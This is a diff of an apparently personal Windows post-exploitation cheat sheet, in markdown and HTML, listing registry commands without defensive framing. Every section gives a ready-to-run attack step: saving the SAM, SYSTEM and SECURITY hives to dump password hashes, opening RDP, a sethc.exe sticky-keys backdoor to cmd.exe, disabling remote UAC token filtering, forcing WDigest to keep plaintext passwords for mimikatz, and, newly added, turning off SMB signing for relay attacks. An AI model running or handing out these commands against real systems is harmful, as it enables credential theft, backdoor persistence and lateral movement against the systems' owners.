@@ -31,8 +31,6 @@ some useful commands and scripts in windows.
 
 dump system hash into .hive file.
 
-use Cain or Impacket to get hash.
-
 ```
 reg save hklm\sam sam.hive
 reg save hklm\system system.hive
@@ -41,7 +39,7 @@ reg save hklm\security security.hive
 
 ## open port 3389
 
-just one command.
+one command.
 
 ```
 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
@@ -49,26 +47,34 @@ REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnec
 
 ## sethc hijacking
 
-shift backdoor
+shift backdoor.
 
 ```
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
 
-## enable remote login access
+## disabled uac policy
 
-for domains, because of uac policy
+allow remote access for other administrator users.
 
 ```
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 ```
 
-## use logon credential
+## store clearpassword in lsass
 
-to use mimikatz to dump plaintext passwords.
+mimikatz for server 2012.
 
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+```
+
+## disable smb signature
+
+smb relay attack.
+
+```
+reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f
 ```
 <!-- markdown end -->
 </xmp>
@@ -80,8 +86,6 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 
 <p>dump system hash into .hive file.</p>
 
-<p>use Cain or Impacket to get hash.</p>
-
 <pre><code>reg save hklm\sam sam.hive
 reg save hklm\system system.hive
 reg save hklm\security security.hive
@@ -89,30 +93,37 @@ reg save hklm\security security.hive
 
 <h2 id="openport3389">open port 3389</h2>
 
-<p>just one command.</p>
+<p>one command.</p>
 
 <pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
 </code></pre>
 
 <h2 id="sethchijacking">sethc hijacking</h2>
 
-<p>shift backdoor</p>
+<p>shift backdoor.</p>
 
 <pre><code>REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 </code></pre>
 
-<h2 id="enableremoteloginaccess">enable remote login access</h2>
+<h2 id="disableduacpolicy">disabled uac policy</h2>
 
-<p>for domains, because of uac policy</p>
+<p>allow remote access for other administrator users.</p>
 
 <pre><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 </code></pre>
 
-<h2 id="uselogoncredential">use logon credential</h2>
+<h2 id="storeclearpasswordinlsass">store clearpassword in lsass</h2>
 
-<p>to use mimikatz to dump plaintext passwords.</p>
+<p>mimikatz for server 2012.</p>
 
 <pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+</code></pre>
+
+<h2 id="disablesmbsignature">disable smb signature</h2>
+
+<p>smb relay attack.</p>
+
+<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f
 </code></pre>
 <!-- content end -->
 </div>
